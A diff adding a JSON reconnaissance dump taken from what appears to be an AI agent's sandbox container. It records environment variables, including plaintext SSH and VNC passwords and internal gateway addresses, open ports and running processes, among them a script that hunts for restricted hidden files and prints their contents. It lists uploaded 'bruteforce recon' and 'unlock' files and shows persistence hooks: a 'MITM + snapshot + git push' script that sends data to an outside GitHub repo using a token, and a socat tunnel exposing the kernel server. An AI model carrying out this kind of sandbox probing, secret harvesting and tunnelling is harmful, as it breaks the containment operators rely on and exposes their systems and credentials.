@@ -1,0 +1,290 @@
+{
+  "timestamp": 1786526041.4916415,
+  "sections": {
+    "env": {
+      "KIMI_PROJECT_PORTAL_CAPABILITY_ENV": {
+        "type": "plain",
+        "raw": "prod"
+      },
+      "PYTHON_SHA256": {
+        "type": "base64",
+        "raw": "fb85a13414b028c49ba18bbd523c2d055a30b56b18b92ce454",
+        "decoded": "}9k]\u05c68m9o\u01f8\u71dauy:8"
+      },
+      "PYTHONUNBUFFERED": {
+        "type": "plain",
+        "raw": "1"
+      },
+      "SCREEN_RESOLUTION": {
+        "type": "plain",
+        "raw": "1920x1080"
+      },
+      "HOSTNAME": {
+        "type": "plain",
+        "raw": "cc57cfd7"
+      },
+      "PYTHON_VERSION": {
+        "type": "plain",
+        "raw": "3.12.12"
+      },
+      "SSH_PASSWORD": {
+        "type": "plain",
+        "raw": "sshpassword"
+      },
+      "KIMI_PROJECT_PORTAL_CAPABILITY_ENABLED": {
+        "type": "plain",
+        "raw": "true"
+      },
+      "S6_LOGGING": {
+        "type": "plain",
+        "raw": "0"
+      },
+      "PWD": {
+        "type": "plain",
+        "raw": "/tmp/kimi-project-kernel"
+      },
+      "XAUTHORITY": {
+        "type": "plain",
+        "raw": "/home/kimi/.Xauthority"
+      },
+      "TZ": {
+        "type": "plain",
+        "raw": "Asia/Shanghai"
+      },
+      "MOONBOX_PROJECT_TEMPLATE_VERSION": {
+        "type": "plain",
+        "raw": "project-20260811-2"
+      },
+      "HOME": {
+        "type": "plain",
+        "raw": "/home/kimi"
+      },
+      "LANG": {
+        "type": "plain",
+        "raw": "C.UTF-8"
+      },
+      "WORKDIR": {
+        "type": "plain",
+        "raw": "/tmp/kimi-project-kernel"
+      },
+      "PIP_TRUSTED_HOST": {
+        "type": "plain",
+        "raw": "mirrors.cloud.aliyuncs.com"
+      },
+      "PIP_EXTRA_INDEX_URL": {
+        "type": "plain",
+        "raw": "https://pypi.msh.team/simple"
+      },
+      "GPG_KEY": {
+        "type": "base64",
+        "raw": "7169605F62C751356D054A26A821E680E5FA6305",
+        "decoded": "^NE`]=9\r\u0003\u0375\u00134\u0013@}9"
+      },
+      "PIP_CACHE_DIR": {
+        "type": "plain",
+        "raw": "/home/kimi/.cache/pip"
+      },
+      "SCF_POD_ID": {
+        "type": "base64",
+        "raw": "cc57cfd7f8aa4b18b3fc5ba42062d3b4",
+        "decoded": "q{q{\u007f\u019a|ow\u5db8Nwv"
+      },
+      "KIMI_PROJECT_PORTAL_CAPABILITY_MOUNT": {
+        "type": "plain",
+        "raw": "/mnt/portal-overlay"
+      },
+      "PIP_INDEX_URL": {
+        "type": "plain",
+        "raw": "https://pypi.mirrors.msh.team/simple"
+      },
+      "DISPLAY": {
+        "type": "plain",
+        "raw": ":99"
+      },
+      "SHLVL": {
+        "type": "plain",
+        "raw": "0"
+      },
+      "CUBE_CONTAINER_ID_SANDBOX": {
+        "type": "base64",
+        "raw": "cc57cfd7f8aa4b18b3fc5ba42062d3b4",
+        "decoded": "q{q{\u007f\u019a|ow\u5db8Nwv"
+      },
+      "PROJECT_WORKSPACE_PATH": {
+        "type": "sensitive",
+        "raw": "/mnt/agents..."
+      },
+      "KERNEL_SERVER_WORKDIR": {
+        "type": "plain",
+        "raw": "/tmp/kimi-project-kernel"
+      },
+      "KIMI_PROJECT_PORTAL_CAPABILITY_PROD_ADDR": {
+        "type": "plain",
+        "raw": "https://kimi-api-sandbox.msh.team/apiv2"
+      },
+      "NODE_PATH": {
+        "type": "sensitive",
+        "raw": "/usr/lib/node_modules..."
+      },
+      "VNC_PASSWORD": {
+        "type": "plain",
+        "raw": "vncpassword"
+      },
+      "MOONBOX_BASE_IMAGE": {
+        "type": "plain",
+        "raw": "msh-sandbox.tencentcloudcr.com/kimiclaw/moonbox-okc:project-20260811-2"
+      },
+      "USE_CDP": {
+        "type": "plain",
+        "raw": "true"
+      },
+      "PATH": {
+        "type": "sensitive",
+        "raw": "/command:/home/kimi/.local/bin..."
+      },
+      "CUBE_CONTAINER_ID_MONITOR_SIDECAR": {
+        "type": "base64",
+        "raw": "094be722380e4d5ab60df6ffe563edda",
+        "decoded": "\u001b{\u001eZo\u001d\u007f{yZ"
+      },
+      "PYTHONUSERBASE": {
+        "type": "plain",
+        "raw": "/home/kimi/.local"
+      },
+      "OLDPWD": {
+        "type": "plain",
+        "raw": "/run/s6-rc:s6-rc-init:KCjlDc/servicedirs/kernel-server"
+      },
+      "JPY_PARENT_PID": {
+        "type": "plain",
+        "raw": "81"
+      },
+      "PYDEVD_USE_FRAME_EVAL": {
+        "type": "plain",
+        "raw": "NO"
+      },
+      "TERM": {
+        "type": "plain",
+        "raw": "xterm-color"
+      },
+      "CLICOLOR": {
+        "type": "plain",
+        "raw": "1"
+      },
+      "FORCE_COLOR": {
+        "type": "plain",
+        "raw": "1"
+      },
+      "CLICOLOR_FORCE": {
+        "type": "plain",
+        "raw": "1"
+      },
+      "PAGER": {
+        "type": "plain",
+        "raw": "cat"
+      },
+      "GIT_PAGER": {
+        "type": "plain",
+        "raw": "cat"
+      },
+      "MPLBACKEND": {
+        "type": "plain",
+        "raw": "module://matplotlib_inline.backend_inline"
+      }
+    },
+    "drive9": {
+      "error": ""
+    },
+    "keys": [],
+    "upload": {
+      "=== BRUTEFORCE NETWORK RECON ===.txt": {
+        "path": "/mnt/agents/upload/=== BRUTEFORCE NETWORK RECON ===.txt",
+        "size": 7372,
+        "is_exec": true,
+        "content_preview": "=== BRUTEFORCE NETWORK RECON ===\n\n--- 1. INTERFACES ---\ndummy0: flags=130<BROADCAST,NOARP>  mtu 1500\n        ether 8a:fb:85:e9:9f:99  txqueuelen 1000  (Ethernet)\n        RX packets 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 0  bytes 0 (0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.183.7.219  netmask 255.255.0.0  broadcast 10.183.255.255\n        in"
+      },
+      "AgentGwClient.txt": {
+        "path": "/mnt/agents/upload/AgentGwClient.txt",
+        "size": 7998,
+        "is_exec": false,
+        "content_preview": "\"\"\"Kimi AgentGW Client Module with Transport Modifications.\"\"\"\nfrom __future__ import annotations\n\nimport json\nimport os\nfrom pathlib import Path\nfrom typing import Any, Dict, Iterator, List, Mapping\nimport requests\nfrom requests.adapters import HTTPAdapter\nfrom urllib3.util.retry import Retry\n\n__version__ = \"1.0.0\"\n\nclass APIError(Exception):\n    def __init__(self, msg: str, status_code: int = 0, body: Any = None, request_id: str = None):\n        super().__init__(msg)\n        self.status_code, "
+      },
+      "kimi.txt": {
+        "path": "/mnt/agents/upload/kimi.txt",
+        "size": 22955,
+        "is_exec": false,
+        "content_preview": "\"\"\"Kimi agent-gw synchronous client module with obtuse transport modifications.\n\nCovered routes (POST unless noted):\n    GET  /v1/models\n    POST /v1/chat/completions       (OpenAI compatible)\n    POST /v1/messages               (Anthropic compatible)\n    POST /v1/messages/count_tokens\n    POST /v1/embeddings\n    POST /v1/search\n    POST /v1/fetch\n    POST /v1/files                  (multipart upload passthrough to OpenGW)\n    POST /v1/storage                (kimifs storage upload)\n    GET  /v1/"
+      },
+      "sniper_super_system.tar.gz.txt": {
+        "path": "/mnt/agents/upload/sniper_super_system.tar.gz.txt",
+        "size": 7291534,
+        "is_exec": true
+      },
+      "unlock.txt": {
+        "path": "/mnt/agents/upload/unlock.txt",
+        "size": 13092,
+        "is_exec": false,
+        "content_preview": "Here is an exhaustive, line-by-line audit and technical breakdown of the Kimi AgentGwClient Python SDK code.\nPart 1: How to Use Completions (Including Unlimited Streaming)\nThe client supports both OpenAI-compatible (/v1/chat/completions) and Anthropic-compatible (/v1/messages) APIs, with native Server-Sent Events (SSE) streaming.\n1. Standard Synchronous Chat Completion\nfrom agent_gw import AgentGwClient\n\nwith AgentGwClient(api_key=\"sk-...\", base_url=\"https://agent-gw-dev.dev.kimi.team/coding\") a"
+      }
+    },
+    "ports": {
+      "listeners": [
+        "ss failed"
+      ],
+      "port_80": "CLOSED",
+      "port_443": "CLOSED",
+      "port_6080": "OPEN",
+      "port_9223": "OPEN",
+      "port_8888": "OPEN",
+      "port_19999": "CLOSED"
+    },
+    "processes": {
+      "interesting": [
+        "root        17  0.0  0.4 100964 20664 hvc0     S+   16:43   0:00 python3 -m http.server 18080 --directory /tmp/project-probe",
+        "root        38  0.0  0.0    216     0 ?        S    16:43   0:00 s6-supervise portal",
+        "root        74  0.1  1.3 1312608 56428 ?       Ssl  16:43   0:03  \\_ /usr/local/bin/portal -http-bind -allow-other -env prod -gateway-addr https://kimi-api-sandbox.msh.team/apiv2 /mnt/portal-overlay",
+        "root      7523  0.0  0.0   2584  1564 ?        S    17:07   0:00      \\_ sh -c find /mnt/agents/output/ -type f -name \"*.json\" 2>/dev/null | xargs -I {} sh -c 'python3 -c \"import json; d=json.load(open(\\\"{}\\\")); print(\\\"{}\\\", list(d.keys())[:5] if isinstance(d,dict) else type(d).__name__)\" 2>/dev/null' | head -30",
+        "root      7544  0.4  0.0   2788  1316 ?        S    17:07   0:01      |   \\_ xargs -I {} sh -c python3 -c \"import json; d=json.load(open(\\\"{}\\\")); print(\\\"{}\\\", list(d.keys())[:5] if isinstance(d,dict) else type(d).__name__)\" 2>/dev/null",
+        "root      7673  0.0  0.0   2584  1456 ?        S    17:07   0:00      \\_ sh -c python3 -c \" import os, glob # Search for hidden files with suspicious permissions for root in ['/mnt/agents', '/mnt/agents/output', '/tmp', '/home', '/root', '/app']:     if os.path.exists(root):         for path in glob.glob(root + '/**/.*', recursive=True):             try:                 st = os.stat(path)                 perms = oct(st.st_mode)[-3:]                 if perms in ['600', '400', '200', '100', '000'] and os.path.isfile(path):                     size = st.st_size                     if size < 10000:                         with open(path, 'rb') as f:                             data = f.read()                         text = data.decode('utf-8', errors='replace')[:200]                         print(f'HIDDEN {perms} {size}b {path}: {text[:100]}')             except Exception as e:                 pass \" 2>&1 | head -50",
+        "root      7697  0.3  0.2  13760 10216 ?        S    17:07   0:01      |   \\_ python3 -c  import os, glob # Search for hidden files with suspicious permissions for root in ['/mnt/agents', '/mnt/agents/output', '/tmp', '/home', '/root', '/app']:     if os.path.exists(root):         for path in glob.glob(root + '/**/.*', recursive=True):             try:                 st = os.stat(path)                 perms = oct(st.st_mode)[-3:]                 if perms in ['600', '400', '200', '100', '000'] and os.path.isfile(path):                     size = st.st_size                     if size < 10000:                         with open(path, 'rb') as f:                             data = f.read()                         text = data.decode('utf-8', errors='replace')[:200]                         print(f'HIDDEN {perms} {size}b {path}: {text[:100]}')             except Exception as e:                 pass ",
+        "root        63  0.0  0.5  29676 24492 ?        Ss   16:43   0:00  \\_ /usr/local/bin/python3 /opt/moonbox-project-template/bin/project-cdp-proxy.py",
+        "root        44  0.0  0.0    216     0 ?        S    16:43   0:00 s6-supervise browser-guard",
+        "kimi        79  0.3  1.9 459864 80460 ?        Ssl  16:43   0:06  \\_ python3 /app/browser_guard.py --wait-display --display :99 --timeout 60 --monitor",
+        "kimi       342  0.5  6.6 55559084 277024 ?     Sl   16:43   0:10      \\_ /usr/lib/chromium/chromium --show-component-extension-options --enable-gpu-rasterization --no-default-browser-check --disable-pings --media-router=0 --enable-remote-extensions --load-extension= chrome://newtab/ --remote-debugging-port=9222 --remote-debugging-address=0.0.0.0 --window-position=0,0 --window-size=1920,1080 --no-first-run --no-default-browser-check --start-maximized --no-sandbox --disable-dbus --disable-gpu --disable-software-rasterizer --enable-logging=file --log-file=/tmp/chromium_detailed.log --disable-infobars --disable-blink-features=AutomationControlled --user-data-dir=/tmp/chromium_user_data --allow-file-access-from-files --load-extension=/app/pdf-viewer --js-flags=\"--max_old_space_size=512\"",
+        "root        45  0.0  0.0    216     0 ?        S    16:43   0:00 s6-supervise kasmvnc",
+        "root        72  0.0  0.0   4352  3064 ?        Ss   16:43   0:00  \\_ /bin/bash /root/setup_kasmvnc.sh",
+        "root        46  0.0  0.0    216     0 ?        S    16:43   0:00 s6-supervise kernel-server",
+        "kimi        81  0.2  2.1 569900 89944 ?        Ssl  16:43   0:03  \\_ python3 /app/kernel_server.py --host 0.0.0.0 --port 8888 --log-level info",
+        "kimi       181  0.2  3.4 1429568 144820 ?      Ssl  16:43   0:04      \\_ /usr/local/bin/python3 -m ipykernel_launcher -f /tmp/tmpj_1jsomr.json",
+        "root       156  0.0  2.2 493228 92172 ?        Sl   16:43   0:01 /usr/bin/Xvnc :99 -SecurityTypes None -AlwaysShared -DisableBasicAuth -publicIP 1.1.1.1 -VideoScaling 2 -BlacklistTimeout 10 -DLP_ClipTypes chromium/x-web-custom-data,text/html,image/png -sslOnly 0 -UseIPv4 1 -cert /etc/ssl/certs/ssl-cert-snakeoil.pem -DLP_RegionAllowRelease 0 -CompareFB 2 -DLP_KeyRateLimit 0 -DLP_Log off -KasmPasswordFile /root/.kasmpasswd -DLP_RegionAllowClick 0 -DynamicQualityMax 8 -AcceptCutText 1 -auth /root/.Xauthority -DLP_ClipSendMax 0 -QueryConnectTimeout 10 -DynamicQualityMin 7 -DLP_ClipDelay 0 -AvoidShiftNumLock 0 -UseIPv6 1 -SendPrimary 0 -IdleTimeout 0 -DisconnectClients 0 -VideoArea 45 -WebpVideoQuality -1 -geometry 1920x1080 -AcceptPointerEvents 1 -VideoTime 5 -TreatLossless 10 -depth 24 -fp /usr/share/fonts/X11//misc,/usr/share/fonts/X11//Type1 -interface 0.0.0.0 -AllowOverride AcceptPointerEvents,SendCutText,AcceptCutText,SendPrimary -RectThreads 0 -httpd /usr/share/kasmvnc/www -VideoOutTime 3 -key /etc/ssl/private/ssl-cert-snakeoil.key -desktop cc57cfd7:99 (root) -SendCutText 1 -MaxDisconnectionTime 0 -IgnoreClientSettingsKasm 0 -QueryConnect 0 -JpegVideoQuality -1 -ImprovedHextile 1 -DLP_ClipAcceptMax 0 -AcceptSetDesktopSize 1 -AcceptKeyEvents 1 -http-header Cross-Origin-Embedder-Policy=require-corp -http-header Cross-Origin-Opener-Policy=same-origin -MaxIdleTime 0 -PrintVideoArea 0 -udpFullFrameFrequency 0 -websocketPort 6080 -BlacklistThreshold 5 -MaxConnectionTime 0 -MaxVideoResolution 1920x1080 -FrameRate 60 -Log *:stdout:30 -RawKeyboard 0 -drinode /dev/dri/renderD128 -rfbwait 30000 -rfbport 5901 -rfbauth /root/.vnc/passwd"
+      ],
+      "total": 56
+    },
+    "hooks": [
+      {
+        "path": "/mnt/agents/output/auto_hook.py",
+        "exists": true,
+        "type": "file",
+        "content_preview": "#!/usr/bin/env python3\n\"\"\"Auto-hook \u2014 subprocess MITM + snapshot + git push. No daemonize, runs under setsid.\"\"\"\nimport os, sys, subprocess, json, time, base64, hashlib, pathlib, threading\n\nGH_PAT = os.environ.get('GITHUB_PAT', '')\nREPO = \"toxicwind/kimi-multi-kernel\"\nOUT = pathlib.Path(\"/mnt/agents"
+      },
+      {
+        "path": "/app/auto_hook.py",
+        "exists": false
+      },
+      {
+        "path": "/tmp/auto_hook.py",
+        "exists": false
+      },
+      {
+        "path": "/mnt/agents/output/bin/tunnel-daemon",
+        "exists": true,
+        "type": "file",
+        "content_preview": "#!/usr/bin/env python3\nimport subprocess, time, signal, sys\nprocs = []\ndef cleanup(*a):\n    for p in procs: p.terminate()\n    sys.exit(0)\nsignal.signal(signal.SIGTERM, cleanup)\n# Tunnel kernel server to 18889\np1 = subprocess.Popen([\"socat\",\"TCP-LISTEN:18889,reuseaddr,fork\",\"TCP:127.0.0.1:8888\"])\npro"
+      },
+      {
+        "path": "/app/.agents/hooks/",
+        "exists": false
+      }
+    ]
+  }
+}
